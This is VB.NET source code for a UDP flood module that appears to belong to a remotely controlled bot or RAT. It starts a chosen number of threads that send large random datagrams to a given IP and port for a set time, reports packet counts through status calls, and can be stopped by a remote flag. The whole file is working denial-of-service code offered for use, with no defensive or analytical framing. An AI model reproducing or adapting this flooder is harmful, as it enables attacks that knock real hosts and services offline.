Imports System.Collections.Generic
Imports System.Text
Imports System.Threading
Imports System.Net.Sockets
Imports System.Net
Imports System.Diagnostics
Public Module UDP

    Private ThreadsEnded = 0
    Private HostToAttack As String
    Private TimetoAttack As Integer
    Private ThreadstoUse As Integer
    Private Port As Integer
    Private Threads As Thread()
    Private AttackRunning As Boolean = False
    Private attacks As Integer = 0
    Public Sub StartUDP(ByVal Host As String, ByVal Threadsto As Integer, ByVal Time As Integer, ByVal Ports As Integer)
        If Not AttackRunning = True Then
            AttackRunning = True
            HostToAttack = Host
            Port = Ports
            ThreadstoUse = Threadsto
            TimetoAttack = Time
            Threads = New Thread(Threadsto - 1) {}
            STV("Flood", "UDP Attack on " & HostToAttack & ":" & Port.ToString & " Started!")
            For i As Integer = 0 To Threadsto - 1
                Threads(i) = New Thread(AddressOf DoWork)
                Threads(i).IsBackground = True
                Threads(i).Start()
            Next

            Dim Stoped As New Threading.Thread(AddressOf StopUDP)
            Stoped.Start()

        Else
            STV("Flood", "A UDP Attack is Already Running on " & HostToAttack & ":" & Port.ToString)
        End If

    End Sub
    Private Sub lol()

        ThreadsEnded = ThreadsEnded + 1
        If ThreadsEnded = ThreadstoUse Then
            ThreadsEnded = 0
            ThreadstoUse = 0
            AttackRunning = False
            STV("Flood", "UDP Attack on " & HostToAttack & ":" & Port.ToString & " finished successfully. Packets Sent: " & attacks.ToString)
            attacks = 0
            STV("Flood|STOP", "True")
        End If

    End Sub

    Public Sub StopUDP()

1:
        If GTV("Flood|STOP") = "False" Then
            Thread.Sleep(1000)
            GoTo 1
        End If

        If AttackRunning = True Then
            For i As Integer = 0 To ThreadstoUse - 1
                Try
                    Threads(i).Abort()
                Catch
                End Try
            Next
            AttackRunning = False
            STV("Flood", "UDP Attack on " & HostToAttack & ":" & Port.ToString & " aborted successfully. Packets Sent: " & attacks.ToString)
            attacks = 0
        Else
            STV("Flood", "No UDP Attack is Running!")
        End If
    End Sub

    Private Sub DoWork()
        Try
            Dim random As New Random
            Dim buffer As Byte() = New Byte(&HFFDC - 1) {}
            Dim i As Integer
            For i = 0 To &HFFDC - 1
                buffer(i) = CByte(random.Next(0, &HFF))
            Next i
            Dim span As TimeSpan = TimeSpan.FromSeconds(CDbl(TimetoAttack))
            Dim stopwatch As Stopwatch = Stopwatch.StartNew
            Dim remoteEP As New IPEndPoint(IPAddress.Parse(HostToAttack), Port) 'IP:PORT
            Do While (stopwatch.Elapsed < span)
                Try
                    Dim _FloodSocket(i) As Socket
                    _FloodSocket(i) = New Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp)
                    _FloodSocket(i).SendTo(buffer, remoteEP) 'SEND THAT SHIT
                    attacks = attacks + 1
                    _FloodSocket(i).Close()
                    Thread.Sleep(100)
                    Continue Do
                Catch
                    Continue Do
                End Try
            Loop
        Catch : End Try
        lol()
    End Sub
End Module
